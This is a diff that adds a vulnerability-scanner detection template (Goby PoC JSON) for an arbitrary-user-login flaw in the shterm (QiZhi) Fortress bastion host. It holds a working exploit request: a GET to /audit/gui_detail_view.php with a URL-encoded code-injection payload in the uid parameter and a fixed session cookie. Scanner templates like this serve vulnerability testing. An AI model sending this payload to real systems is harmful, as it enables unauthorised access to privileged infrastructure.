@@ -1,0 +1,55 @@
+{
+      "Name": "shterm(QiZhi) Fortress Arbitrary User Login",
+      "Level": "3",
+      "Tags": [
+            "Any user login"
+      ],
+      "GobyQuery": "app=\"shterm-Fortres-Machine\"",
+      "Description": "Qizhi fortress machine has any user login vulnerability, access to a specific URL can obtain background permissions",
+      "Product": "shterm(QiZhi) Fortress ",
+      "Homepage": "shterm.com",
+      "Author": "PeiQi",
+      "Impact": "<p>Get background permission<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "PHPSESSID=4uh4l0e3b0fd28d27l71u5be36"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "错误的id",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-09 23:53:26",
+      "GobyVersion": "1.8.255"
+}
